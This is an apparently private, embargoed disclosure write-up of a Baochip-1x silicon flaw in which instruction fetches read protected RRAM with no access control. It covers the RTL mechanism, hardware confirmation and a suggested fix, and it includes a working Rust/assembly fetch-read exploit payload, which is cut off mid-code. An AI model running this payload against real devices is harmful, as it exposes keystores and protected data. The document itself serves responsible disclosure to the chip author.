@@ -1,0 +1,751 @@
+<title>bao1x: Instruction Fetches Read RRAM With No Access Control</title>
+<style>
+:root {
+  --ground:#F1F3F2; --surface:#FFFFFF; --sunk:#E7EBE9;
+  --ink:#14181A; --muted:#5A6468; --hair:#D3DAD7;
+  --accent:#0C7A63; --accent-q:#E4F1ED;
+  --warn:#9A5510; --warn-q:#F8EEE2; --bad:#A32B2B; --lit:#14181A;
+  --mono: ui-monospace,"SF Mono",SFMono-Regular,"JetBrains Mono",Menlo,Consolas,monospace;
+  --sans: ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
+  --step: clamp(1rem,0.6rem + 1.1vw,1.0625rem);
+}
+@media (prefers-color-scheme: dark){:root{
+  --ground:#0D1011; --surface:#15191B; --sunk:#1B2022;
+  --ink:#E4E9E7; --muted:#939E9F; --hair:#2A3134;
+  --accent:#34C6A3; --accent-q:#122924;
+  --warn:#D79A55; --warn-q:#2A2015; --bad:#E38080; --lit:#34C6A3;}}
+:root[data-theme="dark"]{
+  --ground:#0D1011; --surface:#15191B; --sunk:#1B2022;
+  --ink:#E4E9E7; --muted:#939E9F; --hair:#2A3134;
+  --accent:#34C6A3; --accent-q:#122924;
+  --warn:#D79A55; --warn-q:#2A2015; --bad:#E38080; --lit:#34C6A3;}
+:root[data-theme="light"]{
+  --ground:#F1F3F2; --surface:#FFFFFF; --sunk:#E7EBE9;
+  --ink:#14181A; --muted:#5A6468; --hair:#D3DAD7;
+  --accent:#0C7A63; --accent-q:#E4F1ED;
+  --warn:#9A5510; --warn-q:#F8EEE2; --bad:#A32B2B; --lit:#14181A;}
+
+body{background:var(--ground);color:var(--ink);font-family:var(--sans);
+     font-size:var(--step);line-height:1.65;-webkit-font-smoothing:antialiased;}
+.wrap{max-width:60rem;margin:0 auto;padding:3.5rem 1.5rem 6rem;}
+
+header.mast{display:flex;flex-direction:column;gap:1.5rem;margin-bottom:3rem;}
+.glyph{display:grid;grid-template-columns:repeat(8,9px);gap:3px;width:max-content;}
+.glyph i{width:9px;height:9px;background:var(--hair);border-radius:1px;}
+.glyph i.on{background:var(--lit);}
+.eyebrow{font-family:var(--mono);font-size:0.7rem;letter-spacing:0.16em;
+         text-transform:uppercase;color:var(--accent);margin:0;}
+h1{font-family:var(--mono);font-size:clamp(1.7rem,1.05rem + 2.3vw,2.5rem);
+   font-weight:600;letter-spacing:-0.015em;line-height:1.14;margin:0.35rem 0 0;text-wrap:balance;}
+.standfirst{color:var(--muted);max-width:42rem;margin:0.85rem 0 0;}
+
+h2{font-family:var(--mono);font-size:1.02rem;font-weight:650;letter-spacing:0.05em;
+   text-transform:uppercase;margin:3.25rem 0 1.1rem;padding-bottom:0.5rem;
+   border-bottom:1px solid var(--hair);text-wrap:balance;}
+h3{font-size:1.05rem;font-weight:650;margin:2rem 0 0.6rem;text-wrap:balance;}
+p{margin:0 0 1rem;max-width:42rem;}
+ul,ol{margin:0 0 1rem;padding-left:1.3rem;max-width:42rem;}
+li{margin-bottom:0.45rem;}
+a{color:var(--accent);}
+strong{font-weight:650;}
+em.term{font-style:normal;font-weight:650;color:var(--accent);}
+
+code{font-family:var(--mono);font-size:0.855em;background:var(--sunk);
+     padding:0.12em 0.34em;border-radius:3px;overflow-wrap:anywhere;}
+pre{font-family:var(--mono);font-size:0.8rem;line-height:1.6;background:var(--surface);
+    border:1px solid var(--hair);border-left:3px solid var(--accent);border-radius:4px;
+    padding:0.95rem 1.1rem;margin:0 0 1.15rem;overflow-x:auto;}
+pre code{background:none;padding:0;font-size:inherit;}
+.cmt{color:var(--muted);}
+
+ol.steps{list-style:none;padding:0;margin:0;max-width:none;display:flex;
+         flex-direction:column;gap:2rem;counter-reset:s;}
+ol.steps > li{counter-increment:s;display:grid;grid-template-columns:2.4rem 1fr;gap:1.1rem;margin:0;}
+ol.steps > li::before{content:counter(s,decimal-leading-zero);font-family:var(--mono);
+  font-size:0.8rem;font-weight:650;color:var(--accent);background:var(--accent-q);
+  border-radius:4px;height:2rem;display:grid;place-items:center;}
+ol.steps h3{margin-top:0.2rem;}
+ol.steps > li > div > :last-child{margin-bottom:0;}
+
+table{border-collapse:collapse;width:100%;font-size:0.9rem;}
+.scroll{overflow-x:auto;margin:0 0 1.15rem;border:1px solid var(--hair);border-radius:4px;}
+th,td{text-align:left;padding:0.55rem 0.8rem;border-bottom:1px solid var(--hair);vertical-align:top;}
+th{font-family:var(--mono);font-size:0.72rem;letter-spacing:0.07em;text-transform:uppercase;
+   color:var(--muted);background:var(--surface);white-space:nowrap;}
+tbody tr:last-child td{border-bottom:none;}
+td.n{font-family:var(--mono);font-variant-numeric:tabular-nums;white-space:nowrap;}
+
+.note{border-radius:4px;padding:0.9rem 1.1rem;margin:0 0 1.15rem;font-size:0.94rem;}
+.note > :last-child{margin-bottom:0;}
+.note.warn{background:var(--warn-q);border-left:3px solid var(--warn);}
+.note.warn .lab{color:var(--warn);}
+.note.key{background:var(--accent-q);border-left:3px solid var(--accent);}
+.note.key .lab{color:var(--accent);}
+.note.plain{background:var(--surface);border:1px solid var(--hair);}
+.note.plain .lab{color:var(--muted);}
+.lab{font-family:var(--mono);font-size:0.7rem;letter-spacing:0.13em;text-transform:uppercase;
+     font-weight:650;display:block;margin-bottom:0.35rem;}
+
+.flagbox{background:var(--surface);border:1px solid var(--hair);border-radius:4px;
+         padding:1.1rem 1.2rem;margin:0 0 1.15rem;}
+.flagbox .v{font-family:var(--mono);font-size:0.9rem;font-weight:600;
+            overflow-wrap:anywhere;line-height:1.5;margin:0.3rem 0 0;}
+
+dl.gloss{margin:0 0 1.15rem;max-width:42rem;}
+dl.gloss dt{font-weight:650;margin-top:0.9rem;}
+dl.gloss dt:first-child{margin-top:0;}
+dl.gloss dd{margin:0.15rem 0 0;color:var(--muted);}
+
+details.src{background:var(--surface);border:1px solid var(--hair);border-radius:4px;
+            margin:0 0 1rem;overflow:hidden;}
+details.src > summary{cursor:pointer;padding:0.7rem 1rem;font-family:var(--mono);
+  font-size:0.82rem;font-weight:650;letter-spacing:0.02em;list-style:none;
+  display:flex;align-items:center;gap:0.6rem;}
+details.src > summary::-webkit-details-marker{display:none;}
+details.src > summary::before{content:"+";color:var(--accent);font-weight:700;width:0.8em;}
+details.src[open] > summary::before{content:"\2212";}
+details.src > summary:hover{background:var(--sunk);}
+details.src > summary:focus-visible{outline:2px solid var(--accent);outline-offset:-2px;}
+details.src > summary .fnote{font-family:var(--sans);font-weight:400;color:var(--muted);
+  font-size:0.8rem;margin-left:auto;text-align:right;}
+details.src pre{margin:0;border:none;border-top:1px solid var(--hair);border-left:none;
+  border-radius:0;background:var(--surface);}
+
+footer{margin-top:4rem;padding-top:1.25rem;border-top:1px solid var(--hair);
+       color:var(--muted);font-size:0.85rem;}
+@media (max-width:34rem){
+  ol.steps > li{grid-template-columns:1fr;gap:0.5rem;}
+  ol.steps > li::before{width:2rem;}
+  details.src > summary{flex-wrap:wrap;}
+  details.src > summary .fnote{margin-left:0;width:100%;text-align:left;}
+}
+
+blockquote.mail{background:var(--sunk);border-left:3px solid var(--muted);border-radius:4px;
+  padding:0.9rem 1.1rem;margin:0 0 1.15rem;color:var(--muted);font-style:italic;max-width:42rem;}
+blockquote.mail > :last-child{margin-bottom:0;}
+blockquote.mail p{max-width:none;}
+.hdrs{font-family:var(--mono);font-size:0.82rem;background:var(--surface);
+  border:1px solid var(--hair);border-radius:4px;padding:0.8rem 1rem;margin:0 0 1.5rem;}
+.hdrs div{display:flex;gap:0.7rem;padding:0.1rem 0;}
+.hdrs span:first-child{color:var(--muted);min-width:4.2rem;}
+.status{display:inline-flex;align-items:center;gap:0.45rem;font-family:var(--mono);
+  font-size:0.7rem;letter-spacing:0.12em;text-transform:uppercase;font-weight:650;
+  color:var(--warn);background:var(--warn-q);border-radius:999px;padding:0.28rem 0.7rem;}
+.status::before{content:"";width:0.5rem;height:0.5rem;border-radius:50%;background:var(--warn);}
+hr.sep{border:none;border-top:1px solid var(--hair);margin:3rem 0;}
+</style>
+
+<div class="wrap">
+<header class="mast">
+  <div class="glyph" id="g" aria-hidden="true"></div>
+  <div>
+    <p class="eyebrow">Baochip-1x &middot; bao1x &middot; silicon finding</p>
+    <h1>Instruction fetches read RRAM with no access control</h1>
+    <p class="standfirst">
+      Every access-control term in the RRAM controller is gated on a signal that is always
+      zero during an instruction fetch. The keystore, the data slots and the entire IFR are
+      readable by any code that can execute. Confirmed on hardware against the vendor's own
+      factory-provisioned bytes.
+    </p>
+    <p style="margin:1rem 0 0"><span class="status">Unreported &middot; embargoed</span></p>
+  </div>
+</header>
+
+<div class="note warn">
+  <span class="lab">Private. Do not publish.</span>
+  <p>This is a live, unpatched vulnerability in shipped 22 nm silicon. It was found during the
+  DEF CON 34 badge challenge and is being disclosed privately to the chip author. Nothing here
+  may go public until he says so.</p>
+</div>
+
+<h2>Summary</h2>
+
+<p>The Baochip-1x RRAM controller applies its access-control checks only to <em>data</em>
+accesses. The check for "is this a data access" is derived from an AXI signal that the RISC-V
+core hardwires to the opposite value on its instruction bus. The result is that an instruction
+fetch reads protected RRAM with no access control applied at all.</p>
+
+<p>This is <strong>not</strong> the limitation documented in <code>secboot.rs</code>. That
+comment notes that an arbitrary-exec primitive can forge the ASID and work around the coreuser
+mechanism, which is fair. Here there is no forging: <code>satp</code> is never touched, U-mode
+is not required, and ASID 3 is irrelevant. The check is <em>structurally absent</em> for those
+address ranges.</p>
+
+<h2>Mechanism</h2>
+
+<p>Four lines, verified by hand in the published RTL rather than taken from tooling.</p>
+
+<div class="scroll">
+<table>
+  <thead><tr><th>Location</th><th>Code</th><th>Effect</th></tr></thead>
+  <tbody>
+    <tr><td class="n">rrc.sv:679</td><td class="n">assign data_op = !axprot_reg[2];</td><td>"is this a data access"</td></tr>
+    <tr><td class="n">VexRiscv_CramSoC.sv:7508</td><td class="n">assign iBusAxi_ar_payload_prot = 3'b110;</td><td>AxPROT[2] = 1 on every fetch, so <code>data_op = 0</code></td></tr>
+    <tr><td class="n">rrc.sv:717</td><td class="n">key_access_error_pre  = (...) &amp; data_op &amp; keysel</td><td>collapses to 0</td></tr>
+    <tr><td class="n">rrc.sv:726</td><td class="n">data_access_error_pre = (...) &amp; data_op &amp; datasel</td><td>collapses to 0</td></tr>
+    <tr><td class="n">rrc.sv:782</td><td class="n">info_access_error_pre = (...) &amp; axi_info &amp; data_op</td><td>collapses to 0</td></tr>
+    <tr><td class="n">rrc.sv:819</td><td class="n">cfg_access_error_pre  = (...) &amp; data_op</td><td>collapses to 0</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>The only <code>inst_op</code> check is <code>rrc.sv:770</code>, and it additionally requires
+<code>codesel = haddr[31:12] &lt; 20'h603DA</code> (<code>:686</code>, <code>:644</code>). But
+<code>PM_KEY_REGION = 16'h603F</code> (<code>:355</code>),
+<code>PM_DATA_REGION = 16'h603E</code> (<code>:356</code>), and the IFR sits at
+<code>0x60400</code>. All three are <strong>above</strong> that border, so <code>codesel = 0</code>
+and the check never fires. It is also gated on the CPU-writable <code>rrccr[12]</code>
+(<code>:778</code>, <code>:274</code>), so it is defeatable even where it does apply.</p>
+
+<div class="note key">
+  <span class="lab">Why the data path cannot be used instead</span>
+  <p><code>dbus_axi_arw_payload_prot = 3'b010</code> is hardwired at
+  <code>VexRiscv_CramSoC.sv:7591</code>. Data accesses can never set AxPROT[2]. Instruction
+  fetch is the only route, and it is wide open.</p>
+</div>
+
+<h2>Confirmed on hardware</h2>
+
+<p>The IFR is genuinely unreadable to data accesses. A read of IFR <code>0x1a0</code> from
+machine mode returned 128 zeros, and a data sweep of all 32 rows returned zeros for every one.
+The on-chip CRC over that result equalled CRC32 of 128 zero bytes exactly, so it was not a
+decode artifact.</p>
+
+<p>Fetching the same region returned the real contents. The recovered bytes match
+<code>bao1x-boot/blobs/pubkey-block-ifr-0x1a0.bin</code> exactly, at their exact offsets:</p>
+
+<pre><code>slot 0   recovered 0000 5f98 0000 fb51    factory a87a <span class="cmt">5f98</span> daab <span class="cmt">fb51</span>
+slot 1   recovered 2fc3 0000 0000 3beb    factory <span class="cmt">2fc3</span> c2e5 749b <span class="cmt">3beb</span>
+slot 3   recovered 0000 fb9d 0000 0000    factory 5888 <span class="cmt">fb9d</span> a409 523a
+
+zeros are bytes the run did not recover, not mismatches</code></pre>
+
+<p>The payload never held those bytes, and the string <code>1f5ac3cc</code> recovered from row 0
+appears nowhere in the payload image, ruling out stale prefetch. Two independent runs returned
+identical fragments. A known-illegal control word <code>0xFFFFFFFF</code> fetched through the
+same path came back exact, and an on-chip CRC32 matched the host decode of the photographed
+output.</p>
+
+<h2>Reading data by fetching it</h2>
+
+<p>On an illegal-instruction trap, VexRiscv places the faulting word in <code>mtval</code>.
+Fetch at every halfword offset so the reads overlap; each illegal hit yields 2 or 4 bytes
+depending on whether bits [1:0] are <code>11</code>.</p>
+
+<p>Zeroed memory always decodes as <code>c.illegal</code> and traps with <code>mtval = 0</code>,
+so all-zero regions come back at 100 percent coverage. On key-like data roughly 15 of every 16
+offsets trap, and the overlapping windows fill most of the gaps.</p>
+
+<div class="note warn">
+  <span class="lab">The fetched bytes execute. Sandbox them.</span>
+  <p>Unknown data that decodes to a legal instruction will run. The containment is a page table
+  that maps only the target pages, <strong>execute-only</strong> (PTE flags <code>0xD9</code> =
+  D|A|U|X|V, deliberately no R and no W), with the fetch performed in U-mode:</p>
+  <ul>
+    <li>no readable or writable mapping exists, so every load and store faults before reaching
+        MMIO. <code>suicide_start</code> (<code>rrc.sv:307</code>), which erases the whole RRAM
+        array, needs an MMIO store and is therefore unreachable <em>by construction</em></li>
+    <li>CSR access, <code>mret</code>, <code>sret</code>, <code>wfi</code>, <code>ecall</code>
+        and <code>ebreak</code> all trap from U-mode</li>
+    <li>a jump outside the mapped pages takes an instruction page fault</li>
+  </ul>
+  <p>Residual risk is a self-loop inside a mapped page, which a power cycle clears. Nothing can
+  be written, so nothing can be lost.</p>
+</div>
+
+<div class="note warn">
+  <span class="lab">Never brute-force the CMS pattern</span>
+  <p>A non-matching pattern with WMS0 asserted yields <code>CMS_SCDE</code>
+  (<code>cms.sv:135</code>), which fires <code>suicide_start</code> and erases the entire RRAM
+  array, main and IFR (<code>rrc.sv:316-320</code>).</p>
+</div>
+
+<div class="note plain">
+  <span class="lab">Scope, measured after the first report</span>
+  <p>The bypass reaches the <strong>RRAM array</strong>: the main array, the IFR, and the
+  key/data apertures. It does <strong>not</strong> reach ACRAM/cfg at <code>0x603D_C000</code>,
+  which is a separate SRAM on its own port (<code>rrc.sv:342-347</code>). Measured with controls
+  placed inside that region: <code>0x603D_C010</code> (expect <code>02 00 f0 00</code>) and
+  <code>0x603D_C410</code> (expect <code>0x00400000</code>) both read zero while the mechanism
+  control passed in the same run.</p>
+  <p>Also tested and refuted: the idea that U-mode data reads might reach the IFR where M-mode
+  cannot, on the grounds that <code>vex_mm</code> is the inverted privilege signal
+  (<code>cram_axi.sv:20923</code>). The RTL reading is right, the conclusion is not. On hardware
+  a U-mode data read of IFR <code>0x1a0</code> returned zeros exactly like M-mode. <strong>IFR
+  data reads fail in every privilege mode; only fetches succeed.</strong></p>
+</div>
+
+<h2>Impact</h2>
+
+<p>The unsigned-header break needs physical access, a held button and a cold boot. This needs
+only code execution, and it is in silicon rather than firmware. Once you can execute, the
+keystore and the IFR are readable with no ACL in the way and no privilege games required.</p>
+
+<p>Worth noting that <code>rrc.sv</code> carries <code>//#eco16</code> comments right around
+these lines, so the published RTL alone could not tell us whether the taped-out part matched.
+It does. We ran it.</p>
+
+<h3>Suggested fix</h3>
+
+<p>The <code>data_op</code> gating reads like it was meant to say "only data accesses need
+checking", which holds only if instruction fetches can never reach protected regions. They can.
+Either apply the ACL terms regardless of <code>data_op</code> for the key, data and info
+apertures, or extend <code>codesel</code> to cover everything above <code>0x603DA</code> so the
+<code>inst_op</code> path catches them. The second is a smaller change but leaves the
+<code>rrccr[12]</code> gate in the way.</p>
+
+<h2>Negative result: the third key is not in addressable memory</h2>
+
+<p>This primitive was used to hunt the DC34 third key. Everything the CPU can address was
+swept, with the access control bypassed:</p>
+
+<div class="scroll">
+<table>
+  <thead><tr><th>Region</th><th>Result</th></tr></thead>
+  <tbody>
+    <tr><td class="n">keystore data slots 0x603E</td><td>fully enumerated (via the ASID route)</td></tr>
+    <tr><td class="n">key region 0x603F</td><td><strong>entirely zeros.</strong> 100 percent coverage, on-chip CRC identical to CRC32 of 1024 zero bytes. Unpopulated on this part.</td></tr>
+    <tr><td class="n">IFR 0x60400000, first 1 KiB</td><td>read by fetch, verified against the factory blobs</td></tr>
+    <tr><td class="n">extended info space</td><td><code>axi_xadr = haddr[21:10]</code> is twelve bits (<code>:654</code>, <code>:871</code>), so the aperture is 4 MiB, not the 1 KiB <code>IFR_LEN</code> firmware assumes. Content is confined to the low 32 KiB: 36 of 1024 rows non-zero, and the most random-looking row in the whole space is the public key block at 12 distinct byte values.</td></tr>
+    <tr><td class="n">RRAM main array</td><td>entropy-mapped separately, nothing isolated and high-entropy</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p>So the third key is not in CPU-addressable memory anywhere. That corroborates the author's
+own statement from the outside.</p>
+
+<p><code>CMSDAT_TESTMODE</code>, <code>VRGNMODE</code> and <code>ATPGMODE</code>
+(<code>cms.sv:32-38</code>, <code>localparam CMSDW = 128</code>, all four redacted to
+<code>'0</code>) exist <strong>only</strong> as XNOR-tree tie constants in the comparator at
+<code>:126</code>, <code>:130</code>, <code>:134</code>, and as the async-reset polarity of the
+<code>cmsdatareg</code> flop bank at <code>:107</code>. There is no memory holding them and no
+bus carrying them. Die imaging or nothing.</p>
+
+<div class="note plain">
+  <span class="lab">How we knew the redaction was real</span>
+  <p>The published <code>cms.sv</code> is self-contradictory. Line <code>:107</code> resets
+  <code>cmsdatareg</code> to <code>VRGNMODE</code> and <code>:126</code> tests it first, so with
+  all four constants at <code>'0</code> the <code>USERMODE</code> arm at <code>:134</code> is
+  unreachable dead code, while <code>nvrcfgs.sv:103</code> defaults the boot record to
+  <code>USERMODE</code>. The file cannot be what taped out. Neighbouring magics are left in the
+  clear (<code>cpudevmode = 32'h298ca435</code>,
+  <code>defnvrdat256 = 256'hcf9defc0de</code>), so the repository is not blanket-zeroing
+  constants: these four were singled out.</p>
+</div>
+
+<h2>The payload</h2>
+
+<p>Complete and self-contained. Reads by fetching, sandboxes what it reads, and carries its own
+correctness control.</p>
+
+<details class="src"><summary>src/main.rs<span class="fnote">fetch-read payload, complete</span></summary><pre><code>//! DC34 stage-2 payload: read RRAM IFR row 0 by INSTRUCTION FETCH.
+//!
+//! Why: every RRAM access-control term in the chip is ANDed with `data_op`
+//! (rrc.sv:717 key, :726 data, :782 info, :819 cfg), and
+//! `data_op = !axprot_reg[2]` (rrc.sv:679). The VexRiscv instruction bus
+//! hardwires `iBusAxi_ar_payload_prot = 3&#x27;b110` (VexRiscv_CramSoC.sv:7508),
+//! so AxPROT[2]=1 and data_op=0 on every fetch. The only inst_op check
+//! (rrc.sv:770) additionally requires `codesel = haddr[31:12] &lt; 0x603DA`
+//! (:686, :644), and the IFR sits at 0x60400 -- above the border. So an
+//! instruction fetch from the IFR is subject to no access control at all.
+//!
+//! We proved the data path is blocked: a read of IFR 0x1a0, whose contents we
+//! hold on disk (blobs/pubkey-block-ifr-0x1a0.bin), came back as 128 zeros.
+//!
+//! SAFETY. The fetched bytes are unknown and WILL execute if they decode to a
+//! legal instruction. They run in U-mode under a page table that maps exactly
+//! two X-only pages and nothing else:
+//!   * no readable or writable mapping anywhere, so every load/store faults
+//!     before it can reach MMIO. The RRAM `suicide_start` erase (rrc.sv:307)
+//!     needs an MMIO store and is therefore unreachable by construction.
+//!   * CSR access, mret/sret/wfi, ecall and ebreak all trap from U-mode.
+//!   * a jump outside the two pages takes an instruction page fault.
+//! Residual risk is a self-loop inside a mapped page, which a power cycle
+//! clears. Nothing can be written, so nothing can be lost.
+//!
+//! Recovery: on an illegal-instruction trap VexRiscv puts the faulting
+//! instruction word in `mtval`. We fetch at every halfword offset so the reads
+//! overlap, and each illegal hit fills in 2 or 4 bytes.
+//!
+//! Pages: 1 = known-mask | control mtval (MUST be ffffffff)
+//!        2..5 = the 32 recovered bytes
+//!        6 = crc32(row) | hits | nprobe | 5a a5
+
+#![no_std]
+#![no_main]
+
+extern crate alloc;
+
+use core::panic::PanicInfo;
+
+#[panic_handler]
+fn panic(_i: &amp;PanicInfo) -&gt; ! {
+    loop {
+        core::hint::spin_loop()
+    }
+}
+
+const CLKTOP_HZ: u32 = 700_000_000;
+const IFR_BASE: usize = 0x6040_0000;
+const PT_ROOT: usize = 0x6100_0000; // Sv32 root table
+const PT_L0: usize = 0x6100_1000; // level-0 table for the swept region
+const PT_L0B: usize = 0x6100_2000; // level-0 table for our own code page
+// axi_xadr = haddr[21:10] is TWELVE bits (rrc.sv:654,:871), so the info aperture
+// is 4096 xadr pages x 32 rows x 32 bytes = 4 MiB, from 0x6040_0000 to 0x607F_FFFF.
+// Firmware&#x27;s IFR_LEN = 0x400 is xadr 0 alone: one page in four thousand.
+const SWEEP_LEN: usize = 0x8000; // 32 KiB = the 1024 rows that returned content
+const NROWS: u32 = (SWEEP_LEN as u32) / 32;
+const NPROBE: u32 = 1 + (SWEEP_LEN as u32) / 2; // 0 = control, then EVERY halfword
+
+/// A deliberately illegal 32-bit encoding (opcode 0x7f is reserved), sitting in
+/// our own image so we can fetch it through the exact same path as the IFR.
+/// If probe 0 does not return ffffffff the technique is broken and every other
+/// result this run is meaningless.
+#[unsafe(no_mangle)]
+pub static CONTROL_WORD: u32 = 0xFFFF_FFFF;
+
+static mut BUF: [u8; SWEEP_LEN] = [0; SWEEP_LEN];
+static mut NNZ: u32 = 0;
+static mut PROBE_IDX: u32 = 0;
+static mut HITS: u32 = 0;
+static mut CTRL_MTVAL: u32 = 0;
+static mut LAST_MCAUSE: u32 = 0;
+static mut LAST_MTVAL: u32 = 0;
+
+core::arch::global_asm!(
+    &quot;.section .text.entry, \&quot;ax\&quot;&quot;,
+    &quot;.global _start&quot;,
+    &quot;_start:&quot;,
+    &quot;  la   sp, _stack_top&quot;,
+    &quot;  la   t0, __sbss&quot;,
+    &quot;  la   t1, __ebss&quot;,
+    &quot;1:  bgeu t0, t1, 2f&quot;,
+    &quot;  sw   zero, 0(t0)&quot;,
+    &quot;  addi t0, t0, 4&quot;,
+    &quot;  j    1b&quot;,
+    &quot;2:  j payload_main&quot;,
+);
+
+// Every trap from the sandboxed U-mode fetch lands here, in machine mode.
+core::arch::global_asm!(
+    &quot;.section .text, \&quot;ax\&quot;&quot;,
+    &quot;.align 4&quot;,
+    &quot;.global fetch_trap&quot;,
+    &quot;fetch_trap:&quot;,
+    &quot;  la   sp, _stack_top&quot;,
+    &quot;  csrr t0, mcause&quot;,
+    &quot;  la   t1, {mc}&quot;,
+    &quot;  sw   t0, 0(t1)&quot;,
+    &quot;  csrr t0, mtval&quot;,
+    &quot;  la   t1, {mt}&quot;,
+    &quot;  sw   t0, 0(t1)&quot;,
+    &quot;  li   t0, 0x1800&quot;,
+    &quot;  csrs mstatus, t0&quot;, // MPP = 11, back to machine mode
+    &quot;  la   t0, probe_entry&quot;,
+    &quot;  csrw mepc, t0&quot;,
+    &quot;  mret&quot;,
+    mc = sym LAST_MCAUSE,
+    mt = sym LAST_MTVAL,
+);
+unsafe extern &quot;C&quot; {
+    fn fetch_trap();
+}
+
+/// The driver. Re-entered in machine mode after every trap.
+#[unsafe(no_mangle)]
+pub extern &quot;C&quot; fn probe_entry() -&gt; ! {
+    unsafe {
+        let idx = core::ptr::read_volatile(core::ptr::addr_of!(PROBE_IDX));
+
+        // consume the result of the probe we just ran
+        if idx &gt; 0 {
+            let k = idx - 1;
+            let mc = core::ptr::read_volatile(core::ptr::addr_of!(LAST_MCAUSE));
+            let mv = core::ptr::read_volatile(core::ptr::addr_of!(LAST_MTVAL));
+            if k == 0 {
+                core::ptr::write_volatile(core::ptr::addr_of_mut!(CTRL_MTVAL), mv);
+            } else if mc == 2 {
+                let h = core::ptr::read_volatile(core::ptr::addr_of!(HITS));
+                core::ptr::write_volatile(core::ptr::addr_of_mut!(HITS), h + 1);
+                let byte_off = ((k - 1) * 2) as usize;
+                let len = if (mv &amp; 3) == 3 { 4usize } else { 2usize };
+                let buf = core::ptr::addr_of_mut!(BUF) as *mut u8;
+                let mut i = 0usize;
+                while i &lt; len &amp;&amp; byte_off + i &lt; SWEEP_LEN {
+                    core::ptr::write_volatile(buf.add(byte_off + i), (mv &gt;&gt; (8 * i)) as u8);
+                    i += 1;
+                }
+            }
+        }
+
+        if idx &gt;= NPROBE {
+            render(); // -&gt; !
+        }
+        core::ptr::write_volatile(core::ptr::addr_of_mut!(PROBE_IDX), idx + 1);
+
+        // probe 0 is the control word in our own page; 1..16 walk the IFR
+        let target = if idx == 0 {
+            core::ptr::addr_of!(CONTROL_WORD) as usize
+        } else {
+            IFR_BASE + ((idx - 1) as usize) * 2
+        };
+
+        // MPP = 00 so mret returns to U-mode. Done in its own block because
+        // an asm! with `noreturn` may not declare outputs or clobbers.
+        core::arch::asm!(&quot;li t0, 0x1800&quot;, &quot;csrc mstatus, t0&quot;, out(&quot;t0&quot;) _);
+        core::arch::asm!(
+            &quot;csrw mepc, {t}&quot;,
+            &quot;mret&quot;,
+            t = in(reg) target,
+            options(noreturn),
+        )
+    }
+}
+
+#[unsafe(no_mangle)]
+pub extern &quot;C&quot; fn payload_main() -&gt; ! {
+    unsafe {
+        // Sv32, 4 KiB pages. Map ONLY two pages, both execute-only in user mode.
+        // PTE[31:10] = PPN, [7]=D [6]=A [4]=U [3]=X [2]=W [1]=R [0]=V
+        // 0xD9 = D|A|U|X|V  -&gt; executable, NOT readable, NOT writable.
+        let root = PT_ROOT as *mut u32;
+        let l0 = PT_L0 as *mut u32;
+        for i in 0..1024usize {
+            core::ptr::write_volatile(root.add(i), 0);
+            core::ptr::write_volatile(l0.add(i), 0);
+        }
+        // map the 4 KiB page CONTAINING va
+        let map = |addr: usize| {
+            let va = addr &amp; !0xFFF;
+            let vpn1 = va &gt;&gt; 22;
+            let vpn0 = (va &gt;&gt; 12) &amp; 0x3FF;
+            core::ptr::write_volatile(root.add(vpn1), (((PT_L0 as u32) &gt;&gt; 12) &lt;&lt; 10) | 0x01);
+            core::ptr::write_volatile(l0.add(vpn0), (((va as u32) &gt;&gt; 12) &lt;&lt; 10) | 0xD9);
+        };
+        // The whole sweep lives under one 4 MiB region (VPN1 = 0x181), so a single
+        // level-0 table with all 1024 entries covers 0x6040_0000..0x607F_FFFF.
+        core::ptr::write_volatile(root.add(IFR_BASE &gt;&gt; 22), (((PT_L0 as u32) &gt;&gt; 12) &lt;&lt; 10) | 0x01);
+        for i in 0..(SWEEP_LEN / 0x1000) {
+            let pa = (IFR_BASE + i * 0x1000) as u32;
+            core::ptr::write_volatile(l0.add(i), ((pa &gt;&gt; 12) &lt;&lt; 10) | 0xD9);
+        }
+        // our own page sits in a different 4 MiB region, so it needs its own table
+        let cw = core::ptr::addr_of!(CONTROL_WORD) as usize;
+        let l0b = PT_L0B as *mut u32;
+        for i in 0..1024usize {
+            core::ptr::write_volatile(l0b.add(i), 0);
+        }
+        core::ptr::write_volatile(root.add(cw &gt;&gt; 22), (((PT_L0B as u32) &gt;&gt; 12) &lt;&lt; 10) | 0x01);
+        core::ptr::write_volatile(l0b.add((cw &gt;&gt; 12) &amp; 0x3FF), (((cw as u32 &amp; !0xFFF) &gt;&gt; 12) &lt;&lt; 10) | 0xD9);
+        let _ = &amp;map;
+
+        core::arch::asm!(
+            &quot;csrw mtvec, {tv}&quot;,
+            // boot1 leaves these at 0xFFFFFFFF (irq.rs:50-51); without clearing
+            // them our traps go to an uninitialised stvec and the badge hangs.
+            &quot;csrw medeleg, zero&quot;,
+            &quot;csrw mideleg, zero&quot;,
+            &quot;csrw stvec, {tv}&quot;,
+            &quot;sfence.vma&quot;,
+            &quot;csrw satp, {satp}&quot;,
+            &quot;sfence.vma&quot;,
+            tv = in(reg) fetch_trap as usize,
+            satp = in(reg) (1u32 &lt;&lt; 31) | (3u32 &lt;&lt; 22) | ((PT_ROOT as u32) &gt;&gt; 12),
+        );
+    }
+    probe_entry();
+}
+
+#[unsafe(no_mangle)]
+pub extern &quot;C&quot; fn render() -&gt; ! {
+    unsafe {
+        core::arch::asm!(&quot;csrw satp, zero&quot;, &quot;sfence.vma&quot;);
+    }
+    let iox = bao1x_hal::iox::Iox::new(utralib::utra::iox::HW_IOX_BASE as *mut u32);
+    let udma = bao1x_hal::udma::GlobalConfig::new();
+    let mut oled = open_oled(&amp;iox, &amp;udma);
+
+    let ctrl = unsafe { core::ptr::read_volatile(core::ptr::addr_of!(CTRL_MTVAL)) };
+    let buf: &amp;[u8; SWEEP_LEN] = unsafe { &amp;*core::ptr::addr_of!(BUF) };
+
+    let mut best_row = 0usize;
+    let mut best_distinct = 0usize;
+    let mut nz_rows: u32 = 0;
+    for r in 0..(SWEEP_LEN / 32) {
+        let blk = &amp;buf[r * 32..r * 32 + 32];
+        if blk.iter().any(|&amp;b| b != 0) {
+            nz_rows += 1;
+        }
+        let mut seen = [0u8; 32];
+        let mut n = 0usize;
+        for &amp;v in blk.iter() {
+            if !seen[..n].contains(&amp;v) {
+                seen[n] = v;
+                n += 1;
+            }
+        }
+        if n &gt; best_distinct {
+            best_distinct = n;
+            best_row = r;
+        }
+    }
+    let best = &amp;buf[best_row * 32..best_row * 32 + 32];
+    let ba = (IFR_BASE + best_row * 32) as u32;
+    let bc = crc32(best);
+    let p1 = [
